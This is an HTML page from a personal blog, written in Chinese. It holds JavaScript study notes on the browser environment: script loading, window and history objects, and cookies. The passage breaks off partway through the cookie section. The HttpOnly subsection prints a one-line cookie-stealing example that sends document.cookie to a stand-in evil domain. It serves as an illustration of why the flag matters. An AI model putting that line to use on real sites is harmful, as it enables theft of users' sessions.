@@ -1,0 +1,1539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>JavaScript笔记--浏览器环境 - Pinvon&#39;s Blog</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+  <meta name="author" content="Pinvon" />
+  <meta name="description" content="&lt;TODO: insert your description here&gt;" />
+  <meta name="keywords" content="Web" />
+  <style>
+   #ds-thread #ds-reset .ds-comment-body p {color: #ffffff;}
+   #ds-thread #ds-reset .ds-comment-body p a {color: #ff0;}
+   #ds-thread #ds-reset .ds-comment-body p a:hover {color: #0ff;}
+   #disqus_thread a {color: #00ffff;}
+  </style>
+  <link rel="stylesheet" href="https://pinvondev.github.io/media/css/main.css" type="text/css"/>
+  <link rel="stylesheet" href="https://pinvondev.github.io/media/css/comment.css" type="text/css"/>
+</head>
+
+  <body><div class="container">
+<div>
+  <header class="masthead">
+    <h1 class="masthead-title"><a href="https://pinvondev.github.io/">Pinvon&#39;s Blog</a></h1>
+    <p>所见, 所闻, 所思, 所想</p>
+    <nav class="site-nav">
+      <div class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z" fill="#ffff00"/>
+          <path d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z" fill="#ffff00"/>
+          <path d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z" fill="#ffff00"/>
+        </svg>
+      </div>
+      <ul class="trigger">
+        <li><a href="https://pinvondev.github.io/years/">Years</a></li>
+        <li><a href="https://pinvondev.github.io/authors/">Authors</a></li>
+        <li><a href="https://pinvondev.github.io/tags/">Tags</a></li>
+        <li><a href="https://pinvondev.github.io/about/">About</a></li>
+        <li><a href="https://github.com/pinvondev">Github</a></li>
+        <li><a href="https://pinvondev.github.io/rss.xml">RSS</a></li>
+      </ul>
+    </nav>
+    <form method="get" id="searchform" action="http://www.google.com/search">
+      <input type="text" class="field" name="q" id="s" placeholder="Search">
+      <input type="hidden" name="as_sitesearch" value="pinvondev.github.io">
+    </form>
+  </header>
+</div>
+
+<div>
+<div class="post">
+<h1 class="title">JavaScript笔记--浏览器环境</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org3cb1a62">浏览器环境概述</a>
+<ul>
+<li><a href="#org59e14e2">JavaScript代码嵌入网页的方法</a>
+<ul>
+<li><a href="#orgc42ca02">&lt;script&gt;标签: 代码嵌入网页</a></li>
+<li><a href="#orga3ccd1e">&lt;script&gt;标签: 加载外部脚本</a></li>
+<li><a href="#orgd13a580">事件属性</a></li>
+<li><a href="#orga001c24">URL协议</a></li>
+</ul>
+</li>
+<li><a href="#orga7d6235">&lt;script&gt;标签</a>
+<ul>
+<li><a href="#orgc2068ec">&lt;script&gt;位置</a></li>
+<li><a href="#org5db9948">defer属性</a></li>
+<li><a href="#org65b47e9">async属性</a></li>
+<li><a href="#org70fc0b6">脚本的动态加载</a></li>
+<li><a href="#orgead2e41">加载脚本时使用的协议</a></li>
+</ul>
+</li>
+<li><a href="#orga789493">浏览器</a></li>
+</ul>
+</li>
+<li><a href="#org39e0e1a">window对象</a>
+<ul>
+<li><a href="#org8e56985">概述</a></li>
+<li><a href="#org4922cd5">window对象的属性</a></li>
+<li><a href="#orgf2bb953">navigator对象</a></li>
+<li><a href="#org4d9bac2">window.screen对象</a></li>
+<li><a href="#org877ef98">window对象的方法</a></li>
+<li><a href="#orgbd3a798">多窗口操作</a>
+<ul>
+<li><a href="#orge5bf3fa">iframe标签</a></li>
+<li><a href="#org05f8f2e">frames属性</a></li>
+</ul>
+</li>
+<li><a href="#orgb9db3f2">事件</a>
+<ul>
+<li><a href="#org629d0a8">load事件和onload属性</a></li>
+</ul>
+</li>
+<li><a href="#org132b4f8">弹框</a></li>
+</ul>
+</li>
+<li><a href="#orgc6d4152">history对象</a>
+<ul>
+<li><a href="#org05dba11">history.pushState()</a></li>
+<li><a href="#orgd651bbd">history.replaceState()</a></li>
+<li><a href="#orga760f13">history.state属性</a></li>
+<li><a href="#org281c30f">popstate事件</a></li>
+</ul>
+</li>
+<li><a href="#orgde476de">Cookie</a>
+<ul>
+<li><a href="#org0a0252a">Cookie 与 HTTP 协议</a>
+<ul>
+<li><a href="#org4bc1199">生成 Cookie</a></li>
+</ul>
+</li>
+<li><a href="#orge772639">Cookie 的属性</a>
+<ul>
+<li><a href="#org6703cdc">Expires, Max-Age</a></li>
+<li><a href="#orgcd38b9b">Domain, Path</a></li>
+<li><a href="#org91b7e8c">Secure, HttpOnly</a></li>
+<li><a href="#org587b995">实例</a></li>
+</ul>
+</li>
+<li><a href="#org8d3ef8d">修改 Cookie</a></li>
+<li><a href="#org59b4506">document.cookie</a></li>
+<li><a href="#org24f617a">删除 Cookie</a></li>
+<li><a href="#org41294dd">发送 Cookie</a></li>
+</ul>
+</li>
+<li><a href="#org455291d">AJAX</a>
+<ul>
+<li><a href="#org24d5216">概述</a></li>
+<li><a href="#org63f21d9">XMLHttpRequest对象</a></li>
+<li><a href="#orgccc13c8">XMLHttpRequest的属性</a>
+<ul>
+<li><a href="#orge076f73">readyState</a></li>
+<li><a href="#orgf273860">onreadystatechange</a></li>
+<li><a href="#org868101e">response</a></li>
+<li><a href="#orga9d383c">responseType</a></li>
+<li><a href="#org17e9d85">responseText</a></li>
+<li><a href="#orgce1774d">responseXML</a></li>
+<li><a href="#orgdc6d57b">status</a></li>
+<li><a href="#org96917fc">statusText</a></li>
+<li><a href="#orgb94a637">timeout</a></li>
+<li><a href="#orgcf9dab4">事件监听接口</a></li>
+<li><a href="#orgfbabf77">withCredentials</a></li>
+</ul>
+</li>
+<li><a href="#orge3c0dc9">XMLHttpRequest的方法</a>
+<ul>
+<li><a href="#orgb9e1730">abort()</a></li>
+<li><a href="#orgafa0897">getAllResponseHeaders()</a></li>
+<li><a href="#org2de020f">getResponseHeader()</a></li>
+<li><a href="#org3f262b6">open()</a></li>
+<li><a href="#orgf50152d">send()</a></li>
+<li><a href="#orgad417e1">setRequestHeader()</a></li>
+<li><a href="#org5d097f0">overrideMimeType()</a></li>
+</ul>
+</li>
+<li><a href="#org7af3614">XMLHttpRequest的事件</a>
+<ul>
+<li><a href="#org992165f">readyStateChange事件</a></li>
+<li><a href="#org1aa2eac">progress事件</a></li>
+<li><a href="#org44dbf7f">load事件、error事件、abort事件</a></li>
+<li><a href="#org2a75551">loadend事件</a></li>
+</ul>
+</li>
+<li><a href="#org7a31c9d">文件上传</a>
+<ul>
+<li><a href="#orgeb69aef">文件上传</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org3cb1a62" class="outline-2">
+<h2 id="org3cb1a62">浏览器环境概述</h2>
+<div class="outline-text-2" id="text-org3cb1a62">
+</div>
+<div id="outline-container-org59e14e2" class="outline-3">
+<h3 id="org59e14e2">JavaScript代码嵌入网页的方法</h3>
+<div class="outline-text-3" id="text-org59e14e2">
+<ul class="org-ul">
+<li>&lt;script&gt;标签: 代码嵌入网页</li>
+<li>&lt;script&gt;标签: 加载外部脚本</li>
+<li>事件属性: 代码写入HTML元素的事件处理属性, 如 <code>onclick</code> 或 <code>onmouseover</code></li>
+<li>URL协议: URL支持以 <code>javascript:</code> 协议的方式, 执行JavaScript代码</li>
+</ul>
+</div>
+
+<div id="outline-container-orgc42ca02" class="outline-4">
+<h4 id="orgc42ca02">&lt;script&gt;标签: 代码嵌入网页</h4>
+<div class="outline-text-4" id="text-orgc42ca02">
+<div class="org-src-container">
+<pre class="src src-JavaScript">&lt;script type="application/javascript"&gt;
+    console.log('hello world');
+&lt;/script&gt;
+</pre>
+</div>
+<p>
+其中, <code>type</code> 属性用来指定脚本类型, 默认为JavaScript, 因此可以不写.
+</p>
+
+<p>
+如果 <code>type</code> 值是浏览器不认识的, 则脚本不会执行.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orga3ccd1e" class="outline-4">
+<h4 id="orga3ccd1e">&lt;script&gt;标签: 加载外部脚本</h4>
+<div class="outline-text-4" id="text-orga3ccd1e">
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;script src="example.js"&gt;&lt;/script&gt;
+</pre>
+</div>
+
+<p>
+如果脚本文件使用了非英语字符, 还要注明编码.
+</p>
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;script charset="utf-8" src="example.js"&gt;&lt;/script&gt;
+</pre>
+</div>
+
+<p>
+加载外部脚本和直接添加代码块, 这两种方法不能混用.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgd13a580" class="outline-4">
+<h4 id="orgd13a580">事件属性</h4>
+<div class="outline-text-4" id="text-orgd13a580">
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;div onclick="alert('Hello')"&gt;&lt;/div&gt;
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orga001c24" class="outline-4">
+<h4 id="orga001c24">URL协议</h4>
+<div class="outline-text-4" id="text-orga001c24">
+<p>
+URL支持 <code>javascript:</code> 协议, 调用这个URL时, 就会执行JavaScript代码.
+</p>
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;a href="javascript:alert('Hello')"&gt;&lt;/a&gt;
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orga7d6235" class="outline-3">
+<h3 id="orga7d6235">&lt;script&gt;标签</h3>
+<div class="outline-text-3" id="text-orga7d6235">
+</div>
+<div id="outline-container-orgc2068ec" class="outline-4">
+<h4 id="orgc2068ec">&lt;script&gt;位置</h4>
+<div class="outline-text-4" id="text-orgc2068ec">
+<p>
+一般放在页面底部, 因为如果脚本是外部加载的, 网络情况不好时会加载很长时间, 而加载外部脚本时, 浏览器会暂停页面的渲染, 因为JavaScript可以修改DOM, 必须把控制权给它, 否则会导致复杂的线程竞赛问题. 先加载页面再加载JavaScript, 可以让用户不必对着空白的页面. 且放在末尾, DOM结构肯定已经生成, 不存在线程竞赛问题.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;head&gt;
+  &lt;script&gt;
+    console.log(document.body.innerHTML);
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+</pre>
+</div>
+<p>
+上面的代码一定会报错, 因为 <code>document.body</code> 元素还没生成.
+</p>
+
+<p>
+解决办法:
+</p>
+
+<p>
+回调:
+</p>
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;head&gt;
+  &lt;script&gt;
+    document.addEventListener(
+      'DOMContentLoaded',
+      function (event) {
+        console.log(document.body.innerHTML);
+      }
+    );
+  &lt;/script&gt;
+&lt;/head&gt;
+</pre>
+</div>
+
+<p>
+或使用&lt;script&gt;的 <code>onload</code> 属性, 当&lt;script&gt;标签指定的外部脚本文件下载和解析完成时, 会触发一个load事件, 可以把所需执行的代码, 放在这个事件的回调函数里面.
+</p>
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;script src="jquery.min.js" onload="console.log(document.body.innerHTML)"&gt;
+&lt;/script&gt;
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5db9948" class="outline-4">
+<h4 id="org5db9948">defer属性</h4>
+<div class="outline-text-4" id="text-org5db9948">
+<p>
+<code>defer</code> 属性可以推迟 <code>外部JavaScript</code> 的下载, 解决脚本文件下载阻塞网页渲染的问题.
+</p>
+
+<p>
+不能和 <code>document.write()</code> 共用.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org65b47e9" class="outline-4">
+<h4 id="org65b47e9">async属性</h4>
+<div class="outline-text-4" id="text-org65b47e9">
+<p>
+作用同上, 但是是使用另一个进程来下载脚本. 两个属性同时存在时, <code>async</code> 优先.
+</p>
+
+<p>
+但是, 该属性不能保证脚本的执行顺序. 所以并不是说它可以完全替代 <code>defer</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org70fc0b6" class="outline-4">
+<h4 id="org70fc0b6">脚本的动态加载</h4>
+</div>
+
+<div id="outline-container-orgead2e41" class="outline-4">
+<h4 id="orgead2e41">加载脚本时使用的协议</h4>
+<div class="outline-text-4" id="text-orgead2e41">
+<div class="org-src-container">
+<pre class="src src-HTML">&lt;script src="example.js"&gt;&lt;/script&gt;
+&lt;script src="https://example.js"&gt;&lt;/script&gt;
+&lt;script src="//example.js"&gt;&lt;/script&gt;  // 根据页面本身的协议来决定加载协议
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orga789493" class="outline-3">
+<h3 id="orga789493">浏览器</h3>
+<div class="outline-text-3" id="text-orga789493">
+<p>
+为了节省开销, 尽量避免重流和重绘. 技巧:
+</p>
+<ul class="org-ul">
+<li>读取DOM或者写入DOM，尽量写在一起，不要混杂</li>
+<li>缓存DOM信息</li>
+<li>不要一项一项地改变样式，而是使用CSS class一次性改变样式</li>
+<li>使用document fragment操作DOM</li>
+<li>动画时使用absolute定位或fixed定位，这样可以减少对其他元素的影响</li>
+<li>只在必要时才显示元素</li>
+<li>使用window.requestAnimationFrame()，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流</li>
+<li>使用虚拟DOM（virtual DOM）库</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org39e0e1a" class="outline-2">
+<h2 id="org39e0e1a">window对象</h2>
+<div class="outline-text-2" id="text-org39e0e1a">
+</div>
+<div id="outline-container-org8e56985" class="outline-3">
+<h3 id="org8e56985">概述</h3>
+<div class="outline-text-3" id="text-org8e56985">
+<p>
+<code>window</code> 对象是指当前的浏览器窗口, 是所有对象的顶层对象. JavaScript规定, 浏览器环境的所有全局变量, 都是 <code>window</code> 对象的属性.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">var a = 1;
+window.a // 1
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org4922cd5" class="outline-3">
+<h3 id="org4922cd5">window对象的属性</h3>
+<div class="outline-text-3" id="text-org4922cd5">
+<ul class="org-ul">
+<li>window.window: 与this等价</li>
+<li>window.name: 当前浏览器窗口的名字</li>
+<li>window.location: 当前窗口的URL信息</li>
+<li>window.closed: 窗口是否关闭</li>
+<li>window.opener: 返回打开当前窗口的父窗口, 如果没有父窗口, 则返回 <code>null</code></li>
+<li>window.frames: 返回一个类似数组的对象, 成员为页面内所有框架窗口</li>
+<li>window.length: 返回当前网页包含的框架总数. window.frames.length <code>=</code> window.length</li>
+<li>window.screenX, window.screenY: 返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离</li>
+<li>window.innerHeight, window.innerWidth: 返回网页在当前窗口中可见部分的调试和宽度, 即"视口", 当用户放大或缩小网页时, 该属性会变</li>
+<li>window.outerHeight, window.outerWidth: 返回浏览器窗口的高度和宽度</li>
+<li>window.pageXOffset, window.pageYOffset: 返回页面的水平/垂直滚动距离</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgf2bb953" class="outline-3">
+<h3 id="orgf2bb953">navigator对象</h3>
+<div class="outline-text-3" id="text-orgf2bb953">
+<p>
+<code>window.navigator</code> 指向一个包含浏览器信息的对象.
+</p>
+
+<p>
+navigator.userAgent: 返回浏览器的User-Agent字符串, 标示浏览器的厂商和版本信息. 可以大致识别手机浏览器, 方法是测试是否包含 <code>mobi|android|touch|mini</code> 字符串.
+</p>
+
+<p>
+navigator.plugins: 返回一个类似数组的对象, 成员是浏览器安装的插件.
+</p>
+
+<p>
+navigator.platform: 返回用户的OS信息.
+</p>
+
+<p>
+navigator.onLine: 返回用户当前在线还是离线.
+</p>
+
+<p>
+navigator.geolocation: 返回的信息包含用户地理位置的信息.
+</p>
+
+<p>
+navigator.cookieEnabled: 返回布尔值, 表示浏览器是否能储存Cookie.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org4d9bac2" class="outline-3">
+<h3 id="org4d9bac2">window.screen对象</h3>
+<div class="outline-text-3" id="text-org4d9bac2">
+<p>
+screen.height, screen.width: 返回设备分辨率
+screen.availHeight, screen.availWidth: 返回屏幕可用的高度和宽度
+screen.colorDepth: 返回屏幕的颜色深度
+</p>
+</div>
+</div>
+
+<div id="outline-container-org877ef98" class="outline-3">
+<h3 id="org877ef98">window对象的方法</h3>
+<div class="outline-text-3" id="text-org877ef98">
+<p>
+window.moveTo(): 移动浏览器窗口到指定位置(该位置相对于屏幕左上角)
+window.moveBy(): 移动窗口到一个相对位置(该位置相对于窗口左上角)
+window.scrollTo(): 将网页的指定位置, 滚动到浏览器左上角(该位置相对于整张网页)
+window.scrollBy(): 将网页向右, 向下滚动
+window.open(): 新建窗口, 很多浏览器默认不允许脚本自动新建窗口, 因此需要检查是否新建成功 if( null <code>=</code> window.open(...) )
+window.print(): 跳出打印对话框
+window.getComputedStyle(): 接收一个HTML元素为参数, 返回一个包含该HTML元素的最终样式信息的对象
+window.focus(): 激活指定当前窗口
+window.getSelection(): 返回一个Selection对象, 表示用户现在选中的文本, toString()可转成字符串
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgbd3a798" class="outline-3">
+<h3 id="orgbd3a798">多窗口操作</h3>
+<div class="outline-text-3" id="text-orgbd3a798">
+<p>
+window.top: 顶层窗口
+window.parent: 父窗口
+window.self: 当前窗口
+parent.history.back(): 让父窗口的访问历史后退一次
+</p>
+
+<p>
+还有一些变量与上面的变量对象的, 提供给 <code>open()</code>, <code>&lt;a&gt;标签</code>, <code>&lt;form&gt;标签</code> 等引用.
+_top: 顶层窗口
+_parent: 父窗口
+_blank: 新窗口
+</p>
+<pre class="example">
+&lt;a href="somepage.html" target="_top"&gt;Link&lt;/a&gt;
+</pre>
+</div>
+
+<div id="outline-container-orge5bf3fa" class="outline-4">
+<h4 id="orge5bf3fa">iframe标签</h4>
+<div class="outline-text-4" id="text-orge5bf3fa">
+<p>
+对于 <code>iframe</code> 嵌入的窗口, <code>document.getElementById()</code> 可以拿到该窗口的DOM节点, 然后使用 <code>contentWindow</code> 属性获得 <code>iframe</code> 节点包含的 <code>window</code> 对象, 使用 <code>contentDocument</code> 属性获得包含的 <code>document</code> 对象.
+</p>
+
+<p>
+只有当父页面与 <code>iframe</code> 页面来自同一个域名, 两者之间才可以用脚本通信, 否则只能使用 <code>window.postMessage()</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org05f8f2e" class="outline-4">
+<h4 id="org05f8f2e">frames属性</h4>
+<div class="outline-text-4" id="text-org05f8f2e">
+<p>
+<code>window</code> 对象的 <code>frames</code> 属性返回一个类似数组的对象, 成员是所有子窗口的 <code>window</code> 对象, 可以使用这个属性, 实现窗口之间的互相引用.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgb9db3f2" class="outline-3">
+<h3 id="orgb9db3f2">事件</h3>
+<div class="outline-text-3" id="text-orgb9db3f2">
+</div>
+<div id="outline-container-org629d0a8" class="outline-4">
+<h4 id="org629d0a8">load事件和onload属性</h4>
+<div class="outline-text-4" id="text-org629d0a8">
+<p>
+<code>load</code> 事件发生在文档在浏览器窗口加载完毕时, <code>window.onload</code> 属性可以指定这个事件的回调函数.
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">window.onload = function() {
+  var elements = document.getElementsByClassName('example');
+  for (var i = 0; i &lt; elements.length; i++) {
+    var elt = elements[i];
+    // ...
+  }
+};
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org132b4f8" class="outline-3">
+<h3 id="org132b4f8">弹框</h3>
+<div class="outline-text-3" id="text-org132b4f8">
+<p>
+alert(): 只有"确定"按钮, 一般用来通知用户某些信息.
+prompt(): 可以让用户输入信息, 有"确定"和"取消"按钮.
+confirm(): 有"确定"和"取消"按钮, 一般用来征询用户的意见.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgc6d4152" class="outline-2">
+<h2 id="orgc6d4152">history对象</h2>
+<div class="outline-text-2" id="text-orgc6d4152">
+<p>
+<code>window</code> 有一个 <code>history</code> 对象, 用来保存浏览历史.
+history.length: 当前窗口访问的网址数
+history.back(): 返回
+history.forward(): 前进
+history.go(): 移动到指定的页面. history.go(-1)相当于后退一步, history.go(1) 相当于history.forward()
+</p>
+
+<p>
+返回上一页时, 页面通常是从浏览器缓存中加载, 而不是要求服务器发送新的网页.
+</p>
+</div>
+
+<div id="outline-container-org05dba11" class="outline-3">
+<h3 id="org05dba11">history.pushState()</h3>
+<div class="outline-text-3" id="text-org05dba11">
+<p>
+该方法可以添加历史记录. 新加的历史记录必须与当前网址处于同一个域.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgd651bbd" class="outline-3">
+<h3 id="orgd651bbd">history.replaceState()</h3>
+<div class="outline-text-3" id="text-orgd651bbd">
+<p>
+该方法可以修改历史记录, 将当前的网址修改成另一个网址, 但必须与当前网址处于同一个域.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orga760f13" class="outline-3">
+<h3 id="orga760f13">history.state属性</h3>
+<div class="outline-text-3" id="text-orga760f13">
+<p>
+返回当前页面的 <code>state</code> 对象.
+</p>
+
+<p>
+如 www.example.com/page=1, state对象就是 page=1.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org281c30f" class="outline-3">
+<h3 id="org281c30f">popstate事件</h3>
+<div class="outline-text-3" id="text-org281c30f">
+<p>
+当同一个窗口的history对象发生变化时, 就会触发该事件.
+</p>
+
+<p>
+但是, 仅仅调用 <code>pushState()</code> 或 <code>replaceState()</code> 并不会触发该事件, 只有点击了浏览器的后退或前进按钮, 或调用了 <code>back(), forward(), go()</code> 时, 都会触发该事件.
+</p>
+
+<p>
+页面第一次加载时, 不会触发该事件.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgde476de" class="outline-2">
+<h2 id="orgde476de">Cookie</h2>
+<div class="outline-text-2" id="text-orgde476de">
+<p>
+<code>Cookie</code> 是服务器保存在浏览器上的一小段文本信息, 大小不超过4KB, 每次浏览器向服务器发出请求, 都会自动附上这段信息.
+</p>
+
+<p>
+作用: 分辨两个请求是否来自同一浏览器; 保存信息.
+</p>
+
+<p>
+适用场景: 保存登录, 购物车等需要记录的信息, 保存用户的偏好设置, 记录和分析用户行为.
+</p>
+
+<p>
+不推荐用Cookie作为客户端的存储, 因为它的容量只有 4KB, 推荐使用Web storage API和IndexedDB.
+</p>
+
+<p>
+Cookie包含的信息: 名字, 值, 到期时间, 所属域名(默认当前域名), 生效路径(默认当前网址)
+</p>
+
+<p>
+如, 用户访问网址 www.example.com, 服务器向浏览器写入一个 Cookie(浏览器可以拒绝接受). 这个 Cookie 就会包含 www.example.com 这个域名以及根路径 /. 意思是这个Cookie对该域名的根路径和它的所有子路径都有效. 如果路径设为 /forums, 那么这个 Cookie 只有在访问 www.example.com/forums 及其子路径时才有效. 以后, 浏览器一旦访问这个路径, 浏览器就会附上这段 Cookie 发送给服务器.
+</p>
+
+<p>
+window.navigator.cookieEnabled: 浏览器是否接受 Cookie
+document.cookie: 当前网页的 Cookie
+</p>
+
+<p>
+如果单个域名的 Cookie 超过了 4KB, 则超出部分将被忽略.
+</p>
+
+<p>
+浏览器的同源政策: 如果两个网址域名和端口相同, 就可以共享本地的 Cookie. 所以 <a href="http://example.com">http://example.com</a> 可以读取 <a href="https://example.com">https://example.com</a> 的 Cookie.
+</p>
+</div>
+
+<div id="outline-container-org0a0252a" class="outline-3">
+<h3 id="org0a0252a">Cookie 与 HTTP 协议</h3>
+<div class="outline-text-3" id="text-org0a0252a">
+<p>
+Cookie 由 HTTP 协议生成, 为 HTTP 协议服务.
+</p>
+</div>
+
+<div id="outline-container-org4bc1199" class="outline-4">
+<h4 id="org4bc1199">生成 Cookie</h4>
+<div class="outline-text-4" id="text-org4bc1199">
+<p>
+如果服务器想在浏览器保存 Cookie, 要在 HTTP 响应的信息头中, 加入 Set-Cookie 字段:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+</pre>
+</div>
+<p>
+这表示生成了两个 Cookie(每个浏览器为单个域名的 Cookie 数量和大小限制不同, 一般是不能超过 30 个 Cookie, 每个大小不超过 4KB), 第 1 个 Cookie 名为 yummy_cookie, 值为 choco.
+</p>
+
+<p>
+除了 Cookie 名称之外, 我们还可以设置许多其他属性.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orge772639" class="outline-3">
+<h3 id="orge772639">Cookie 的属性</h3>
+<div class="outline-text-3" id="text-orge772639">
+</div>
+<div id="outline-container-org6703cdc" class="outline-4">
+<h4 id="org6703cdc">Expires, Max-Age</h4>
+<div class="outline-text-4" id="text-org6703cdc">
+<p>
+Expires: 指定 Cookie 的到期时间, 到期后浏览器不再保留该 Cookie; 它的值是 UTC 格式, 可以使用 Date.prototype.toUTCString() 进行格式转换. 注意, 这个时间以浏览器本地时间为准, 所以服务器不能依赖自己的时间来判断 Cookie 是否过期.
+</p>
+
+<p>
+Max-Age: 指定 Cookie 从现在开始可以存在的秒数.
+</p>
+
+<p>
+如果使用了 Cookie, 却未设置 Expires 或 Max-Age 属性, 则 Cookie 只在当前会话有效, 如果浏览器窗口关闭, 该 Cookie 就会被删除; 如果同时设置了 Expires 和 Max-Age 属性, 则 Max-Age 优先.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgcd38b9b" class="outline-4">
+<h4 id="orgcd38b9b">Domain, Path</h4>
+<div class="outline-text-4" id="text-orgcd38b9b">
+<p>
+Domain: 指定浏览器发出 HTTP 请求时, 哪些域名要附带这个 Cookie. 如果没有指定, 则浏览器默认将当前 URL 的一级域名作为 Domain 对应的值.
+</p>
+
+<p>
+Path: 指定当浏览器发出 HTTP 请求时, 哪些路径要附带这个 Cookie. 如: Path 属性的值是 /, 则 /docs 路径也会包含该 Cookie.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org91b7e8c" class="outline-4">
+<h4 id="org91b7e8c">Secure, HttpOnly</h4>
+<div class="outline-text-4" id="text-org91b7e8c">
+<p>
+Secure: 指定浏览器只有在 HTTPS 加密协议下, 才将该 Cookie 发送到服务器.
+</p>
+
+<p>
+HttpOnly: 指定该 Cookie 无法通过 JavaScript 脚本获取, 如: Document.cookie, XMLHttpRequest对象, Request API. 这样可以防止该 Cookie 被脚本读到. 只有浏览器发出 HTTP 请求时, 才会带上该 Cookie. 如果未指定该属性, 恶意脚本可以通过类似如下操作, 将当前网页的 Cookie 发到第三方服务器:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">(new Image()).src="http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org587b995" class="outline-4">
+<h4 id="org587b995">实例</h4>
+<div class="outline-text-4" id="text-org587b995">
+<div class="org-src-container">
+<pre class="src src-JavaScript">Set-Cookie: id=a2fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org8d3ef8d" class="outline-3">
+<h3 id="org8d3ef8d">修改 Cookie</h3>
+<div class="outline-text-3" id="text-org8d3ef8d">
+<p>
+如果服务器想要修改一个已经设置过了的 Cookie, 则必须至少匹配: Cookie 的 key, domain, path, secure 四个属性. 如, 原始的 Cookie 内容如下:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">Set-Cookie: key1=value1; domain=example.com; path=/blog
+</pre>
+</div>
+
+<p>
+正确的改法:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">Set-Cookie: key1=value2; domain=example.com; path=/blog
+</pre>
+</div>
+
+<p>
+错误的改法:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">Set-Cookie: key1=value2; domain=example.com; path=/
+</pre>
+</div>
+
+<p>
+由于改错了, 导致又生成了一个新的 Cookie, 所以当下一次访问 example.com/blog 时, 会发送两个 Cookie, 这两个 Cookie 的名称相同:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">Cookie: key1=value1; key1=value2
+</pre>
+</div>
+
+<p>
+注意, Cookie 名是 key1, 名有值, 值是 value1, value2.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org59b4506" class="outline-3">
+<h3 id="org59b4506">document.cookie</h3>
+<div class="outline-text-3" id="text-org59b4506">
+<p>
+如果 Cookie 没有 HttpOnly 属性, 则可以通过 document.cookie 来读写当前网页的 Cookie.
+</p>
+
+<p>
+如果当前的网页有 key 分别为 foo 和 baz 的两个 Cookie, 则 document.cookie 会将它们都读取出来:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">document.cookie  // "foo=bar;baz=bar"
+var cookies = document.cookie.split(';');
+for (var i=0; i&lt;cookie.length; i++) {
+    console.log(cookies[i]);
+}
+// foo=bar
+// baz=bar
+</pre>
+</div>
+
+<p>
+document.cookie 还可以写入 Cookie:
+</p>
+<div class="org-src-container">
+<pre class="src src-JavaScript">document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
+
+// 或者
+document.cookie = 'fontSize=14; '
+  + 'expires=' + someDate.toGMTString() + '; '
+  + 'path=/subdirectory; '
+  + 'domain=*.example.com';
+</pre>
+</div>
+<p>
